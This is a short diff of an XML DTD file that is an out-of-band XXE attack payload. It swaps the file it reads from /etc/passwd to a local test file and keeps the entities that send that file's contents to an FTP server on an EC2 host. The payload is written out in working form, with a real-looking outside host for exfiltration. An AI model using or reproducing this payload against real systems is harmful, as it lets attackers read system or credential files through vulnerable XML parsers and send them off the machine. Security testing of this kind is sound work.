@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///Users/tmichaud/testFile">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://ec2-54-149-38-219.us-west-2.compute.amazonaws.com:2121/?x=%file;\n'>">
 %eval;
 %exfiltrate;
